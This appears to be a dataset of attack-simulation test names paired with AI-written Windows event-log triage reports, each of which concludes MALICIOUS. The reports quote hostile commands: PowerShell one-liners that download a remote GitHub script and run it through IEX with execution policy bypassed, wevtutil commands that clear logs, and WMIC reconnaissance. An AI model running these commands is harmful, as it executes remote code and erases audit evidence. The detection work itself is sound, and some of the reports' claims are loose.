2. **Event Log Clearing**:
   - Entries indicate that log files in the System, Security, and Windows PowerShell channels have been cleared (`EventID: 104` in System log and `EventID: 1102` in Security log, both with the username ""admin_test""). This activity is highly suspicious as attackers often clear logs to hide their tracks after performing malicious activities.

3. **Command Execution**:
   - There are multiple executions of `wevtutil.exe` to clear logs, including via Sysmon logs. The `wevtutil.exe` command is commonly used for maintaining log files but combined with the PowerShell activity, it further raises suspicion about unauthorized or malicious activities.

4. **Time Manipulation**:
   - The Security logs show a change in the system time (`EventID: 4616`). Time changes are performed by attackers to manipulate event logs' timestamps, making it harder to correlate between logs and reconstruct an attack timeline.

5. **Sysmon Logging**:
   - The Sysmon logs capture the PowerShell execution used in the suspicious script and multiple instances of `wevtutil.exe` clearing logs, suggesting deliberate actions to evade detection.

Based on the above analysis, the combination of scripting activity to invoke processes through PowerShell, clearing of event logs, suspicious time changes, and command executions strongly indicate unauthorized and potentially malicious actions.

**Conclusion: MALICIOUS**

**Recommended Actions:**

1. **Immediate Isolation**: Isolate the affected host (Server002) from the network to prevent any further propagation or exfiltration.
2. **Conduct Forensics**: Perform deeper forensic analysis on the host to look for any other indicators of compromise, such as persistence mechanisms, additional compromised accounts, or artifacts left.
3. **Monitor and Review**: Increase monitoring on other network systems for similar activities or indicators of compromise.
4. **Patch and Update**: Ensure that all systems and security measures, including antivirus, are updated.
5. **User Awareness and Training**: Conduct security awareness for users to ensure they understand and can better avoid possible phishing or other social engineering attacks that might lead to such compromises."
Create a Process using WMI Query and an Encoded Command,"Upon reviewing the provided logs, several indicators suggest potentially malicious activity consistent with an unauthorized actor attempting to obfuscate their actions. Here's a summary of the findings:

1. **Suspicious Process Activity:**
   - **Use of `wevtutil.exe`:** This utility is used to clear or manage event logs. Multiple instances of this process were initiated within a short timeframe, specifically targeting key logs: `System`, `Application`, `Security`, and `Windows PowerShell` logs.
   - **Execution of `cmd.exe` with Encoded PowerShell Commands:** Log entry shows `cmd.exe` executing a PowerShell command with execution policy bypass and base64 encoded script (observed in ProcessId `4724` and its descendants). This is highly characteristic of attempts to execute malicious scripts clandestinely.

2. **Clearing Event Logs:**
   - The Security, System, and Windows PowerShell logs were cleared (`EventID 1102` in the Security log and `EventID 104` in System logs), which is a known tactic to hide evidence of compromise.

3. **Time Manipulation:**
   - The time was altered as seen in `Kernel-General` and `Security` logs (`EventID 4616` and `EventID 1, Version 2`) to modify system times, another technique frequently associated with malicious attempts to confuse log timelines.

4. **Processes Initiated with High Integrity Level:**
   - Processes were executed with high integrity, using the `SERVER002\admin_test` user, pointing to potentially abusive execution using high privileges.

5. **Obfuscated/Encoded Command Usage:**
   - The use of Base64 encoding for PowerShell commands (`-exec bypass` with encoded commands) is a technique employed to evade detection mechanisms.

**Assessment:**
Given the combination of these factors, the activity observed in these logs is indicative of malicious intent. The behavior aligns with known techniques for concealing unauthorized actions, such as clearing logs, using encoded commands, and manipulating time records.

**Resolution:**
- **MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Isolate the affected system from the network to prevent any further potential malicious activity.
   
2. **Comprehensive Analysis:**
   - Perform a forensic analysis to understand the scope of the compromise.
   - Review other systems for similar activity.
   
3. **Review User Privileges:**
   - Conduct a review of user accounts, particularly `admin_test`, and enforce strict privilege management.

4. **Incident Response:**
   - Engage the incident response team to assess any broader implications or further penetration into the network.

5. **Log Retention and Monitoring:**
   - Implement enhanced monitoring for similar patterns in log entries and establish log retention policies to prevent unauthorized deletions.
   
6. **Update Security Measures:**
   - Patch vulnerabilities and update firewall rules to avert any further unauthorized access. 

Following these steps will help mitigate the immediate threat and prevent future incidents."
WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,"After thoroughly analyzing the provided logs, the following indicators of malicious activity stand out:

### Analysis
1. **Log Cleared Events**:
   - Multiple instances of event logs being cleared, specifically the Security, Application, and System logs. This is a common tactic used by malicious actors to cover their tracks. Specifically, in Security Event ID 1102 shows that the security log was cleared by a user named `admin_test`.

2. **Suspicious PowerShell Execution**:
   - PowerShell logs indicate the execution of an inline script from an external source (`https://raw.githubusercontent.com/.../NamedPipe/NamedPipeSystem.ps1`). This script's purpose seems to be related to privilege escalation through named pipes, which is often seen in post-exploitation frameworks.
   - The command line includes ""iex(new-object net.webclient).downloadstring"", which is a known risky pattern for executing code directly from a URL.

3. **Service Creation and Manipulation**:
   - Event entries show the creation and manipulation of a service (`svcHighPriv`), indicative of an attempt to gain elevated privileges. The service was created to run a command that writes to a named pipe, which aligns with the privilege escalation technique observed.

4. **Process Activity**:
   - Several command line utilities (e.g., `wevtutil` and `sc.exe`) were executed by `admin_test`, which are usually used by administrators to perform serious system changes, further indicating potential misuse of administrative privileges.
   - The `wevtutil` command was used to clear logs, corroborating the log clearing activities noted above.

5. **Use of Cmd.exe and Console Host (conhost.exe)**:
   - Frequent invocation of `cmd.exe` and companion Console Host processes, which often are used in script execution or manipulation activities, possibly related to the service and PowerShell script execution mentioned above.

### Assessment
The combination of these activities signifies a potential compromise where the attacker had administrative privileges or escalated privileges and executed scripts from external sources to manipulate system services and clear event logs.

### Resolution
**Resolution: MALICIOUS**

### Guidance
1. **Immediate Actions**:
   - Isolate the affected host from the network to prevent further spread of the potential compromise.
   - Preserve and collect forensic evidence for further investigation and legal obligations.
   - Conduct a deeper investigation to determine the extent of the compromise and identify any additional affected systems.

2. **Further Investigation**:
   - Analyze any associated user accounts for suspicious activity and reset credentials.
   - Review network logs and communications for potential data exfiltration or lateral movement.
   - Ensure all affected scripts or processes are terminated and removed from affected systems.

3. **Remediation**:
   - Apply security patches and harden configurations on affected systems to prevent similar attacks in the future.
   - Enhance monitoring to detect similar patterns of suspicious behavior, especially focusing on PowerShell and log manipulation activities.

By identifying and mitigating the root cause of the compromise, future incidents can be better managed or prevented."
WMI Reconnaissance Software,"Upon reviewing the provided logs from the Windows host, several notable events may indicate potential malicious activity:

1. **Event Log Clearing**:
   - The Security log entry with Event ID 1102 and the System log with Event ID 104 indicate that logs were cleared by the user `admin_test`. Log clearing is a common method employed by attackers to hide their tracks. The logs being cleared in rapid succession (System, Security, and PowerShell logs) further suggests an attempt to cover up actions taken on this system.

2. **Use of `wevtutil.exe` Command**:
   - Events from the Sysmon log show multiple instances of `wevtutil.exe` (Eventing Command Line Utility) being executed by `admin_test` to clear event logs (e.g., `CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`). This tool is generally used for managing the Windows Event logs. Frequent use, particularly in conjunction with changes to sensitive logs like the Security and System logs, is indicative of potentially malicious behavior.

3. **Time Manipulation**:
   - The System log shows Event ID 1 from the Kernel-General provider, indicating that the system time was altered. This type of activity can be associated with various nefarious uses, such as attempting to confuse forensic investigations or bypass time-based controls.

4. **Command Line Activity**:
   - There is evidence of command-line activity using `wmic`, `hostname`, `whoami`, and `cmd.exe` with potentially unnecessary repeated queries (e.g., `wmic qfe get description,installedOn /format:csv`). While not inherently malicious, the context surrounding these utility executions could suggest system reconnaissance, which often precedes other malicious activity.

**Assessment**:
- The combination of log clearing, time adjustments, and use of system utilities suggests suspicious behavior.

**Resolution**:
- **MALICIOUS**: The actions—particularly the log clearing and time tampering—indicate attempts to evade detection and hinder an investigation, which are consistent with malicious intent.

**Guidance on Proceeding**:
1. **Isolate the Compromised System**: To prevent further potential damage or lateral movement within the network, consider isolating Server002.
2. **Conduct a Thorough Investigation**: Perform a detailed forensic analysis of the system, reviewing any available backups or other logs to piece together activity the attacker may have concealed.
3. **Change Credentials**: Reset all credentials associated with the `admin_test` account and review all user accounts for unauthorized changes.
4. **Monitor for IoCs**: Set up continuous monitoring to detect similar Indicators of Compromise (IoCs) across your network.
5. **Review Security Policies**: Consider implementing stricter access and logging policies to prevent unauthorized access and ensure quick detection of anomalies in the future."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,"Based on the provided logs, here is a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Audit Logs Clearing:**
   - **Sysmon EventID 5** and **Security EventID 1102** show that the security log was cleared by the user `admin_test`. Clearing of logs, especially security logs, can be considered a suspicious action as it might indicate an attempt to hide malicious activities.
   - **System EventID 104** shows that various logs including ""System"" and ""Windows PowerShell"" were cleared by the same user `admin_test`. 

2. **Powershell Activity:**
   - The execution of PowerShell with an encoded command is observed in Sysmon EventID 1 for the process `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`. The command line indicates the use of encoded command execution, which is a common technique used to obfuscate command and control instructions or malicious scripts.
   - The strange command line starting with `""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop}` is potentially indicative of malicious script execution, given its atypical structure and the use of encoded commands.

3. **Command Line Tools Usage:**
   - The usage of `C:\\Windows\\System32\\wevtutil.exe` to clear event logs (as seen multiple times in the logs) corresponds to malicious behavior, specifically covering tracks by deleting evidence from event logs.
   - Multiple invocations of system utilities such as `wevtutil` and `conhost.exe` in conjunction, especially with high integrity level and no apparent legitimate administrative task context, raise flags for potentially malicious operations.

### Conclusion:
- The combination of log clearing activities, PowerShell usage with encoded commands, and the systematic execution of potentially suspicious console applications (wevtutil and conhost.exe), all executed under a high integrity context without a clear legitimate purpose, suggests attempts to obfuscate or hide activities.
- While not every individual event can outright confirm malicious intent, the combination and context of these activities strongly lean towards unauthorized or malicious activity.

### Resolution:
**MALICIOUS** - The logs contain enough indicators of potentially malicious actions such as log tampering, execution of suspicious commands, and behaviors consistent with attempts to evade detection.

### Guidance on How to Proceed:
1. **Immediate Action:**
   - Isolate the affected host from the network to prevent further potential propagation of malicious activity.
   - Conduct a thorough analysis and capture memory and disk images for forensic investigation.

2. **Investigation and Remediation:**
   - Retrace the activities of the user `admin_test` and analyze any additional endpoints they have accessed.
   - Review user permissions and roles to ensure no unauthorized privileges are granted.
   - Implement stricter controls on PowerShell execution and use Application Whitelisting to prevent unauthorized script execution.

3. **Monitoring and Prevention:**
   - Increase logging and monitoring, focusing on activities that involve high privilege accounts and critical system changes.
   - Train users and administrators on proper security practices and ensure awareness of social engineering techniques that may compromise account credentials.

Such actions can help determine the full scope of the breach and prevent future occurrences."
OSTap Style Macro Execution,"Upon reviewing the provided Windows event logs, I've identified several activities that suggest potential malicious activity. Let's analyze each segment:

### **1. Sysmon Logs Analysis:**

- There's a noticeable pattern of PowerShell execution through `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, with command-line arguments invoking a script from a GitHub URL (`""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1""`). This script is part of a known penetration testing framework, and downloading and executing scripts from external repositories is suspicious and often indicative of malicious intent.
  
- Execution of `wevtutil.exe cl` on multiple occasions demonstrates logs being cleared. This command is used to clear Windows event logs and is often a tactic used to cover tracks by malicious actors.

### **2. Application Logs:**

- The entries in the Software Protection Platform service do not directly indicate malicious activity. However, its proximity to suspicious events should prompt further investigation.

### **3. System Logs:**

- Log entries 104 are from the system channel, indicating that the event log was cleared by the user `admin_test`. This is inherently suspicious as clearing logs can be an indication of an attempt to hide malicious activities.
  
### **4. Windows PowerShell Logs:**
  
- Event entries (600, 400, 403) show PowerShell sessions starting with scripts from URLs, as seen in Sysmon logs. Such behavior is common in attack setups or execution of malicious payloads, especially concerning when logs indicate subsequent events leading to the closure of PowerShell sessions.

### **5. Security Logs:**

- Security Event log (1102) confirms that a log was cleared by the user `admin_test`. This action along with other suspicious activities suggests attempts to remove evidence of actions taken on the server.

### **Assessment:**
The combination of execution of suspicious PowerShell scripts, clearing of Windows event logs with potential malware execution context (`Invoke-MalDoc` is a known malicious script used in testing and attack scenarios), and the behavior of log clearing are strong indicators of malware or unauthorized activity.

### **Resolution:**
**MALICIOUS**

### **Guidance for Proceeding:**
- Immediately quarantine the affected host.
- Analyze network traffic for connections corresponding to the malicious script download.
- Conduct a deep-dive forensic investigation into the system for persistence mechanisms and further compromises.
- Review and reinforce security policies, particularly minimizing administrative privileges and enhancing PowerShell script execution policies.
- Consider notifying the incident response team to contain and remediate the threat effectively.

These logs suggest an active threat that should be treated with caution and urgency.
"
Malicious Execution from Mounted ISO Image,"Upon analyzing the provided logs, several observations indicate potential malicious activities and warrant further investigation:

1. **PowerShell Activities**:
   - The PowerShell logs show command execution that is typical of downloading and executing potentially malicious files. The use of `Invoke-Expression (IEX)` combined with `Invoke-WebRequest (iwr)` to download a file named `qbot-test.iso` from an external source is highly suspicious.
   - After downloading, the script mounts the ISO and navigates to its path to execute a shortcut (`calc.exe.lnk`). While `calc.exe` is a benign application, executing it from a mounted image from the internet is non-standard behavior and suggests an attempt to execute malicious payloads disguised as legitimate files.

2. **Sysmon Logs**:
   - There is evidence of activity consistent with privilege escalation and process creation from unexpected paths. The execution of `cmd.exe` with parameters to run `calc.exe` in a manner controlled by a PowerShell script is suspicious.
   - Frequent mentions of `wevtutil.exe` indicate someone might be clearing logs or manipulating them to cover tracks, which aligns with the clearing of Event Logs noted in both Security (EventID 1102) and System Logs (EventID 104).
   - Multiple processes related to Microsoft Edge updates are seen, but given the context and timing near other suspicious events, these might be disguises for malicious activity and should be analyzed.

3. **Security Events**:
   - Event 4624 reveals multiple system logins, and Event 4672 shows accounts being granted administrative privileges. This in a timeline of other suspicious system activities suggests an intention to consolidate control over the system.
   - Log clear operations in EventID 1102 indicate attempts to deter auditing and investigation, a common approach for attackers covering their activities.

4. **Anomalies**:
   - The presence of repeated sysmon and security log IDs for process activities aligned with potentially benign system files and updates, such as `MicrosoftEdgeUpdate.exe`, could be benign, but the specific execution paths and methods in the logs warrant closer inspection given the suspicious surrounding activity.

Overall, the evidence strongly suggests potential malicious activity focused on executing and potentially delivering a payload via an ISO image—a method that is commonly associated with malware distribution. 

**Resolution**: MALICIOUS

**Recommendations**:
- Immediately isolate the affected host to prevent lateral movement within the network.
- Conduct a thorough forensic analysis on the system to identify any additional persistence mechanisms or payloads that had been executed.
- Reset administrative credentials and review all privileged accounts for unauthorized access.
- Establish network monitoring and review outbound connections for any contact with known-bad IPs or domains related to the observed URL.
- Enhance logging and monitoring on affected systems, looking particularly for unusual file accesses and process creation events.
- Consider re-imaging the system to ensure a clean state if signs of compromise are beyond repair through standard cleanup."
Cobalt Strike Artifact Kit pipe,"Upon analyzing the provided Windows event logs, I have determined the following indicators of suspicious and potentially malicious behavior:

1. **Event Log Clearing Activities:**
   - The logs show multiple entries for event log clearing (Event ID 1102 in the Security log and Event ID 104 in the System and PowerShell logs) performed by the user `admin_test` on the machine `Server002`. Clearing event logs can be an indication of an attempt to cover tracks after unauthorized activities.

2. **Execution of Suspicious Processes:**
   - There are multiple executions of `wevtutil.exe`, a command-line utility for managing Windows events. It was run with the `cl` (clear) option indicating logs were being cleared for “Microsoft-Windows-Sysmon/Operational”, “Application”, and other logs.
   - The presence of `namedpipes_executor.exe` and `namedpipes_server.exe` located in a temporary directory is suspicious, especially given the context as these might be part of a lateral movement strategy or command and control toolkits.

3. **Rapid Process Creation and Remote Command Execution:**
   - The logs show a rapid execution sequence involving different system utilities, such as `whoami.exe`, `hostname.exe`, and `cmd.exe`, which could point towards script-based automation often seen in post-exploitation stages.

4. **Use of Admin Account:**
   - Activities are carried out using an admin account (`SERVER002\\admin_test`), and such actions can indicate potential privilege misuse or a compromised account.

5. **Unusual PowerShell Activity:**
   - Although specific PowerShell log entries were not provided, the presence of PowerShell processes (`powershell.exe`) without any indication of typical administrative tasks is suspicious, especially when correlated with the log-clearing activities.

Given these observations, the logs contain activities that align with typical indicators of compromise. The actions such as event log clearing, execution of potentially harmful scripts or binaries from temporary directories, and actions performed using an admin account suggest malicious intent.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Security Measures:**
  - Isolate the affected system (Server002) from the network to prevent further unauthorized access and lateral movement.
  - Conduct a thorough investigation of the admin account `admin_test` to determine if the credentials were compromised.
  - Review other systems for similar activities or connections to suspicious binaries/scripts initiated from `Server002`.

- **Forensic and Remediation Actions:**
  - Preserve and analyze memory and disk images from the affected system to gather evidence and identify the scope of the breach.
  - Review firewall and network logs to identify any anomalous communications, especially concerning known malware command and control addresses or domains.
  - Change all credentials associated with the affected system and enforce strict access controls moving forward.

- **Long-Term Security Improvements:**
  - Establish logging and alerting mechanisms for key security actions like event log clearing and admin-level access.
  - Enhance user awareness and training on security best practices to reduce the risk of credential compromise.
  - Consider deploying Endpoint Detection and Response (EDR) solutions to detect and respond to suspicious activities proactively."
Pipe Creation - PsExec Tool Execution From Suspicious Locations,"Based on the logs provided, several indicators suggest potential malicious activity, warranting a closer inspection:

1. **Event Log Clearing**: 
   - The logs show multiple instances of the `wevtutil.exe` command used to clear the System, Security, and PowerShell log files, executed by the user `admin_test`. This activity is suspicious because attackers often clear logs to cover their tracks after gaining unauthorized access or elevating their privileges.

2. **Use of PsExec**:
   - The execution of `PsExec.exe`, a trusted sysinternals tool by Microsoft, is commonly used for lateral movement during cyber intrusions. It's used in conjunction with PowerShell to execute commands remotely, which can be exploited by attackers, particularly when used with high privileges.

3. **Suspicious PowerShell Activity**:
   - Multiple PowerShell commands were executed, including one with unrestricted execution policies which is typically restricted by default for security reasons. Commands involved directory changes and execution of scripts that seem out of the ordinary for typical usage unless specifically required by administrative tasks.

4. **Privileged User Logs**:
   - The `admin_test` account, which appears to have extensive privileged rights, shows a pattern of activity consistent with compromised accounts. The user is associated with attempts to leverage multiple high-privilege tokens. Such privileges can circumvent many security mechanisms if misused.

5. **User and System Event Correlation**:
   - There are logs indicating the successful logon of the `admin_test` account with elevated tokens and subsequent usage of tools that can be leveraged to access and exfiltrate data or execute commands within the system environment.

**Assessment**: Based on these observations, particularly the event log clearing and suspicious use of tools such as `PsExec` alongside PowerShell with elevated permissions, the logs present strong indicators of a potential intrusion.

**Resolution**: MALICIOUS

**Guidance on how to proceed**:
- Immediately isolate the machine from the network to prevent further potential damage or data exfiltration.
- Conduct a deeper forensic analysis to understand the full scope, including what data might have been accessed or changed.
- Review and reinforce security measures, such as segmenting the network, enhancing access control policies, and ensuring logs cannot be easily manipulated.
- Reset credentials for affected accounts, especially those with privileged access.
- Consider engaging with an incident response team to further explore the extent of the breach and remediate any vulnerabilities exploited."
Cobalt Strike post-exploitation pipe (4.2 and later),"Upon reviewing the provided logs, several indicators of potentially malicious activity arise based on the events recorded:

1. **Event Log Clearing:** The logs show multiple instances of event log clearing using `wevtutil.exe`. This is evident through multiple Sysmon EventID 1 (Process Creation) logs showing `wevtutil.exe` executed with the command line argument `cl` to clear different logs. Clearing Windows event logs can be a significant indicator of malicious activity as attackers often attempt to cover their tracks post-compromise. Specifically:
   - The security logs were cleared (Security log Event ID 1102)
   - The Sysmon, Application, and Windows PowerShell logs were cleared (multiple occurrences in Sysmon logs).

2. **Use of High Privilege Processes and Privilege Escalation:** The logs indicate the user `admin_test` was granted high privilege tokens, including SeDebugPrivilege, SeTakeOwnershipPrivilege, and others (Security log Event ID 4672). This can signal that the account had elevated privileges, possibly beyond what is typical or necessary.

3. **Execution of Suspicious Programs:** The execution of the program `namedpipes_executor.exe` from an unusual location (`C:\Users\ADMIN_~1\AppData\Local\Temp\ExternalPayloads\build`) is suspicious. The presence of file paths like `AtomicRedTeam` might indicate use in a penetration test or might suggest a hacker is disguising their tools as a legitimate testing framework.

4. **Presence of Multiple Suspicious Tools:** The logs show the execution of several potentially unwanted or dangerous programs from directories generally utilized for temporarily holding files.
   - `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` look to be related to activity involving inter-process communication, potentially for data exfiltration or lateral movement.
   - The execution of `whoami.exe` and `hostname.exe` implies the account was querying system-specific and user-specific information, which could be part of an enumeration phase.

Overall, the logs provide multiple indicators consistent with malicious activity. These include the usage of potentially harmful programs, log-clearing actions to hide tracks, and privilege escalation activity. Therefore, the level of certainty regarding malicious intent is high.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
- **Immediate Incident Response:** Implement immediate containment measures, such as isolating the affected system from the network to prevent further malicious activity.
- **Detailed Forensics:** Conduct a thorough forensic investigation to understand the scope of the breach and identify any other affected systems or compromised data.
- **Review and Audit Privileges:** Conduct a review of user privileges to ensure that no account has more permissions than necessary and investigate suspicious accounts like `admin_test`.
- **Monitoring and Log Analysis:** Establish enhanced monitoring for unusual activity and regularly review logs for cleanup patterns or other signs of compromise.
- **Initiate Incident Reporting:** Notify the information security team and comply with any regulatory requirements to report the incident as needed.
- **System Restoration:** After investigation and cleansing, consider rebuilding the system from a known good state and apply renewed security hardening measures."
WMI Reconnaissance List Remote Services,"Upon analyzing the provided Windows event logs, the following observations and potential indicators of malicious activity are noted:

1. **Event Log Clearing:**
   - Multiple instances of ""wevtutil.exe"" being used to clear event logs (""wevtutil cl"") for various channels (Security, System, Application, Microsoft-Windows-Sysmon/Operational, and Windows PowerShell). Event log clearing, especially by an administrative user account, can be an indicator of malicious activity as attackers often clear logs to hide their tracks. This activity is executed by the user ""SERVER002\\admin_test"", which is suspicious.

2. **Privilege Escalation:**
   - Event ID 4672 suggests that the user ""admin_test"" logged onto the system with a set of privileges that include SeDebugPrivilege and SeTakeOwnershipPrivilege, among others. This privilege set is commonly associated with high-level administrative tasks or possible exploitation activities where a user requires elevated permissions.
   
3. **Unusual Command Execution:**
   - Use of WMIC to query for services related to ""Spooler"". This behavior could potentially be related to a reconnaissance activity where the attacker is querying services on the machine.
   - Execution of ""whoami.exe"" and ""hostname.exe"" by ""admin_test"". While common in some scripts or diagnostics, these commands can also be used by an attacker to gather information about the host.
   
4. **Time/Date Discrepancy:**
   - The Kernel-General events indicate a change in the system time or the adjustment of time settings, which might suggest an attempt to manipulate time-related logs or system operations.

5. **Security Audit Events:**
   - Event ID 1102 (Log file clearing events) in the security logs correlate with the ""wevtutil.exe"" commands and support the evidence of log tampering.

### Assessment:
Based on the analysis, the activities exhibited in these logs strongly indicate malicious behavior. The systematic clearing of logs, the execution of potentially informative and reconnaissance-related commands under a high-privileged user account, and the manipulation of system time are red flags for potential insider threats or a compromised administrative account executing illicit actions.

### Resolution:
- **MALICIOUS** - The activities captured in these logs are consistent with efforts to cover tracks and potentially escalate privileges or maintain persistence on the system. Immediate action should be taken to contain and investigate the full scope of the compromise.

### Guidance:
1. **Immediate Containment:**
   - Isolate the affected host (Server002) from the network to prevent further lateral movement.
   
2. **Digital Forensics:**
   - Acquire memory dumps and complete disk images for forensic analysis to detect any additional compromise.
   - Review other connected hosts for similar activities or indicators of compromise.

3. **Review and Audit:**
   - Conduct a thorough audit of accounts with administrative privileges. Reset passwords and investigate any unauthorized changes or usage.
   - Implement enhanced monitoring and logging to prevent and detect future incidents.

4. **Security Posture Enhancement:**
   - Ensure security patches are up-to-date.
   - Re-evaluate security policies, especially concerning administrative access and log retention policies.

Following these steps should aid in mitigating the current threat and strengthening overall security defenses."
WMI Reconnaissance Users,"Upon reviewing the provided Windows event logs from the host with the identifier ""Server002,"" several indicators suggest a potential compromise or at least suspicious activities that warrant further investigation. Below is a detailed breakdown of the suspicious activities observed:

### Initial Observations:

1. **Event ID 1102 (Security Log Cleared):**
   - The Event ID 1102 in the Security event log indicates that the security log was cleared by the user ""admin_test"" on the server ""Server002."" Clearing event logs is often a technique used by attackers to cover their tracks and remove evidence of their activities.
   
2. **Privilege Escalation:**
   - Event IDs 4672 and 4624 indicate that the user ""admin_test"" is obtaining a set of special privileges (such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`), which can be indicative of an account being used for unauthorized administrative activities or preparation for lateral movement within a network.
   
3. **Suspicious Process Activity:**
   - **Cmd.exe & WMIC.exe Execution:** Sysmon events show the execution of `cmd.exe` initiating a WMIC command to enumerate user accounts with `/ALL` and `/format:csv`. Such command indicating user enumeration is often used in reconnaissance phases of an attack.
   - **Wevtutil.exe Execution:** Multiple instances of `wevtutil.exe` being invoked to clear logs (Commands like `cl Security`) are suspicious, aligning with potential log clearing acts observed previously.
   
4. **Time Manipulation:** 
   - Kernel-General logs show that the system time was forcibly modified (security log events 4616, system log events 1 and 24). Time manipulation can be employed to either confuse log timelines or circumvent time-based security measures.

5. **Potential Credential Access:**
   - Event ID 4798 indicates enumeration of security group memberships by “admin_test,” possibly attempting to escalate privileges further or conduct reconnaissance on account permissions.

### Assessment and Resolution:

The combination of these activities — particularly the event log clearance, execution of system enumeration commands, and acquisition of elevated privileges — are classic indicators of potentially malicious behavior on a system:

- The sequence of events, especially the clearing of security and system logs, coupled with privilege escalation, suggest this activity is not normal administrative behavior.

### Final Resolution: **MALICIOUS**

Given the critical nature of these logs and suspect activities, it is advisable to take immediate action:
- **Isolate the System**: Prevent further communication with this potentially compromised host within the network to limit any attacker from spreading.
- **Full Forensic Investigation**: Initiate a comprehensive forensic investigation on the host to gather and preserve evidence.
- **Review Access Logs & Privileges**: Thoroughly assess user accounts and their privileges across the network to mitigate any unauthorized access or privilege abuse.
- **Restore from Backup**: Consider restoring the system from a backup before the events occurred to return it to a known good state.

Enhanced monitoring and reviewing security policies are further recommended to prevent such occurrences in the future."

### **Security Log Analysis:**
1. **EventID 1102:** Indicates that the security audit log was cleared. This is performed by the user `admin_test` from `SERVER002` at the time `2024-10-23 12:24:26.5891577`.
   - **Suspicious Behavior:** Clearing event logs can be a sign of malicious activity attempting to cover tracks. 
   - **Username:** `admin_test` indicates an administrative user was involved, leaving a higher likelihood for abuse.

### **System Log Analysis:**
1. **EventID 104:** The System and Windows PowerShell logs have been cleared at nearly the same time as the security logs, cleaned by `admin_test`.
   - **Suspicious Behavior:** Clearing multiple logs in quick succession is very indicative of malicious behavior attempting to cover evidence of executed commands or errors.

### **Application Log Analysis:**
- Several entries related to Microsoft Edge Update service. Nothing inherently suspicious as the Edge Update stopping and starting could be legitimate.

### **Sysmon Log Analysis:**
1. **EventID 1 (Process Creation):** Multiple `wevtutil.exe` commands were issued to clear ""Security"", ""System"", and ""Windows PowerShell"" logs, executed under `admin_test`.
   - **Suspicious Behavior:** The use of `wevtutil.exe` to clear logs in this manner aligns with attempts to destroy evidence of potential malicious actions.
   
2. **EventID 5 (Process Termination):** Termination events directly following the creation logs validate the activity tracked above.

3. **Command Line Execution:** There is an entry mentioning `cmd.exe` executed a script from a temporary directory path that looks suspicious (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1059.003\\src\\t1059.003_cmd.cmd`). 
   - **Suspicious Behavior:** Execution of scripts from temporary directories is a hallmark of malicious execution, especially when in combination with cleared logs.

### **Windows PowerShell Log Analysis:**
- Unfortunately, Windows PowerShell logs are missing to add context. However, earlier log clearing indicates potential PowerShell execution.

## **Assessment and Recommended Resolution:**

Based on the combination of cleared logs (especially the security log), presence of suspicious script execution from temporary directories, and the lack of additional legitimate explanations or context from missing logs, the activities are strongly indicative of a compromise attempt, likely malicious in nature.

Given these indicators, I would classify the situation as:
- **Resolution: MALICIOUS**

### **Recommendations:**
1. **Immediate Action:**
   - Isolate the machine from the network to prevent further unauthorized access or data exfiltration.
   - Commence a deeper forensic investigation to retrieve potentially decoded or removed files/logs.
   - Notify internal IT security team and stakeholders of a potential compromise.

2. **Further Steps:**
   - Conduct a thorough review of user account accesses and strengthen security controls.
   - Audit key services and applications for tampering, especially the ones cleared from logs.
   - Review and possibly redesign logging infrastructure to prevent unauthorized clearance without alerting.

3. **Long-Term Measures:**
   - Implement stricter security auditing policies and ensure critical logs are secured and regularly backed up.
   - Provide training and awareness sessions for administrative users to prevent abuse of privileges.
   - Consider adopting more robust incident response procedures incorporating automated alerts for such behavioral anomalies."

#### Suspicious/Anomalous Behavior
1. **Clearing of Event Logs**:
   - Several entries in both the Security, System, and Sysmon logs indicate the use of `wevtutil.exe` to clear event logs. This activity is often used maliciously to cover tracks post-compromise.

   - Security Log Entry: 
     - Event ID 1102 indicates a log clearance by the user 'admin_test'.
   - System Log Entry:
     - Event ID 104 indicates the clearing of various logs, including the ""System"" and ""Windows PowerShell"" channels by the same user.
   - Sysmon Log Entries:
     - Multiple Event ID 1 entries showing the execution of `wevtutil.exe` with the clear (`cl`) flag for various logs.

2. **PowerShell Execution**:
   - The Windows PowerShell log shows the execution of a PowerShell command with the `-exec bypass` flag, fetching and executing a script from a remote GitHub repository. This is indicative of potential malicious script execution over the network.
   - The command used: `powershell.exe -exec bypass -noprofile $comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp; $comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False); $comMsXml.Send(); IEX $comMsXml.ResponseText`

3. **Time Change Events**:
   - There were several adjustments to the system time as logged in Event ID 4616 and corresponding System and Kernel-General logs. Alterations to system time can potentially be used to manipulate or disrupt logging and other time-sensitive operations.

4. **Unexpected System Commands**:
   - The execution of system utilities such as `cmd.exe`, `hostname.exe`, and `whoami.exe` around the same time as the aforementioned suspicious activities suggest possible reconnaissance or situational awareness tactics used by an attacker.

#### Indication of Malicious Activity or Compromise
The combination of log clearing, suspicious PowerShell execution, time manipulation, and use of system commands strongly suggests malicious activity. The execution of a script from a public GitHub repository using PowerShell with execution policy bypassed is a common method for downloading and executing malicious scripts.

### Assessment and Resolution

- **Assessment**: The logs indicate a strong presence of activities typically associated with post-exploitation or ongoing malicious actions. The combination of log clearing and remote script execution using PowerShell highlights a breach scenario rather than benign activity.

- **Threats/Risks**:
  - The execution of arbitrary scripts from an external source.
  - Alteration of logs to hide malicious activity.
  - Potential data exfiltration or further compromise of the system/network.

### Guidance on How to Proceed

1. **Resolution**: **MALICIOUS** - The activity observed in the logs is highly concerning and suggests malicious compromise.

2. **Immediate Actions**:
   - Isolate the affected host (Server002) from the network to prevent further spread.
   - Initiate a full forensic investigation to determine the extent of the compromise.
